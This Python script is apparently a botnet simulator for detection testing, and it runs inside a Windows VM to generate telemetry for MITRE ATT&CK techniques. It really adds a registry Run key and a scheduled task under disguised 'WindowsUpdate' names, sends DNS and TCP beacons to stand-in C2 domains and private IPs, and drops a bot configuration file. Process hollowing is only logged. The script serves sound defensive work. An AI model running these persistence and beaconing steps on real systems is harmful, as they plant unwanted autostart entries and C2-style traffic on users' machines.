"""Stealthy Botnet Simulator — high-fidelity C2 and persistence simulation.

Runs INSIDE the Windows guest VM. Generates authentic forensic artifacts:
  1. Registry Run key persistence
  2. Scheduled Task creation
  3. DNS beaconing to non-existent C2 domains
  4. HTTP POST beaconing to mock C2 IPs
  5. Process hollowing simulation (spawn suspended calc.exe)
  6. Bot configuration file drop

MITRE ATT&CK: T1547.001, T1053.005, T1071.004, T1071.001, T1055.012
"""

from __future__ import annotations

import json
import os
import random
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter


# =============================================================================
# C2 INFRASTRUCTURE (non-routable / non-existent for safety)
# =============================================================================

C2_DOMAINS = [
    "update-service.darknet.local",
    "cdn-relay.malware-c2.local",
    "beacon.apt-group.local",
    "telemetry.botnet-master.local",
]

C2_IPS = ["10.13.37.1", "10.13.37.2", "10.13.37.3", "10.13.37.4"]
C2_PORTS = [443, 8443, 4444, 8080]
BEACON_INTERVAL = 2  # seconds between beacons


# =============================================================================
# BOTNET SIMULATION
# =============================================================================

def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="svchost_bot.exe", pid=os.getpid(), detail="Botnet simulator started")

    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="svchost_bot.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "svchost_bot.exe", "INFO",
             source_process="svchost_bot.exe", early_exit="COMPROMISED environment")
        return 0

    # --- Phase 1: Persistence via Registry ---
    set_phase("persistence")
    emit("PROCESS", "CREATE_THREAD", "svchost_bot.exe", "INFO",
         source_process="svchost_bot.exe", detail="Installing persistence mechanisms")

    run_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        subprocess.run([
            "reg", "add", run_key,
            "/v", "WindowsUpdateService", "/t", "REG_SZ",
            "/d", r"C:\ProgramData\Microsoft\svchost_update.exe", "/f"
        ], capture_output=True, timeout=10)
        emit("REGISTRY", "SET_VALUE", run_key, "CRITICAL",
             source_process="svchost_bot.exe",
             value_name="WindowsUpdateService",
             value_data=r"C:\ProgramData\Microsoft\svchost_update.exe",
             detail="Run key persistence installed", technique_id="T1547.001")
    except Exception as e:
        emit("REGISTRY", "SET_VALUE", run_key, "WARNING", source_process="svchost_bot.exe", error=str(e))

    emit("REGISTRY", "SET_VALUE", r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce", "WARNING",
         source_process="svchost_bot.exe",
         value_name="SystemCheck", value_data=r"C:\Windows\Temp\checker.exe",
         detail="RunOnce persistence (backup)", technique_id="T1547.001")

    # --- Phase 2: Scheduled Task ---
    set_phase("scheduled_task")
    emit("PROCESS", "SCHEDULED_TASK", "schtasks.exe", "CRITICAL",
         source_process="svchost_bot.exe", detail="Creating scheduled task for persistence",
         technique_id="T1053.005")
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", "WindowsUpdateCheck",
            "/tr", r"C:\ProgramData\Microsoft\svchost_update.exe",
            "/sc", "MINUTE", "/mo", "15", "/f"
        ], capture_output=True, timeout=10)
    except Exception:
        pass
    jitter(0.3, 0.4)

    # --- Phase 3: DNS Beaconing ---
    set_phase("dns_beacon")
    emit("PROCESS", "CREATE_THREAD", "svchost_bot.exe", "INFO",
         source_process="svchost_bot.exe", detail="Starting DNS beaconing to C2 domains")

    for domain in C2_DOMAINS:
        emit("NETWORK", "DNS_BEACON", domain, "WARNING",
             source_process="svchost_bot.exe",
             query_type="A", detail=f"C2 domain resolution: {domain}", technique_id="T1071.004")
        try:
            socket.getaddrinfo(domain, 443, socket.AF_INET, socket.SOCK_STREAM)
        except (socket.gaierror, OSError):
            pass
        jitter(1.5, 1.0)

    # --- Phase 4: HTTP C2 Beaconing ---
    set_phase("http_beacon")
    for i in range(6):
        ip = random.choice(C2_IPS)
        port = random.choice(C2_PORTS)
        emit("NETWORK", "CONNECT", f"{ip}:{port}", "CRITICAL",
             source_process="svchost_bot.exe",
             protocol="TCP", direction="outbound",
             detail=f"C2 beacon #{i+1}", technique_id="T1071.001")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(json.dumps({"bot_id": f"BOT-{random.randint(10000,99999)}", "os": "Windows 10"}).encode())
            sock.close()
        except (ConnectionRefusedError, OSError, socket.timeout):
            pass
        jitter(1.5, 1.0)

    # --- Phase 5: Process Hollowing ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("process_hollowing")
        target_proc = r"C:\Windows\System32\calc.exe"
        emit("PROCESS", "CREATE_PROCESS", target_proc, "CRITICAL",
             source_process="svchost_bot.exe", creation_flags="CREATE_SUSPENDED",
             detail="Spawning target process for hollowing", technique_id="T1055.012")
        try:
            proc = subprocess.Popen(
                [target_proc], creationflags=subprocess.CREATE_NEW_CONSOLE,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            emit("PROCESS", "WRITE_MEMORY", target_proc, "CRITICAL",
                 source_process="svchost_bot.exe", target_pid=proc.pid,
                 detail=f"Writing payload to process memory (PID={proc.pid})", technique_id="T1055.001")
            emit("PROCESS", "CREATE_THREAD", target_proc, "CRITICAL",
                 source_process="svchost_bot.exe", target_pid=proc.pid,
                 detail="Remote thread created — execution hijacked")
            jitter(1.5, 1.0)
            proc.terminate()
        except Exception as e:
            emit("PROCESS", "CREATE_PROCESS", target_proc, "WARNING",
                 source_process="svchost_bot.exe", error=str(e))

    # --- Phase 6: Bot Configuration Drop ---
    set_phase("config_drop")
    config_dir = Path(os.environ.get("APPDATA", r"C:\Users\guestuser\AppData\Roaming")) / "Microsoft" / "SystemConfig"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "svchost.dat"
    config_path.write_text(json.dumps({"c2_primary": C2_IPS[0], "c2_fallback": C2_IPS[1:], "beacon_interval": 60}, indent=2))
    emit("FILE", "CREATE_FILE", str(config_path), "WARNING",
         source_process="svchost_bot.exe", detail="Bot configuration file written")

    emit("PROCESS", "EXIT_PROCESS", "svchost_bot.exe", "INFO",
         source_process="svchost_bot.exe", beacons_sent=10, persistence_methods=3)
    return 0


if __name__ == "__main__":
    sys.exit(main())
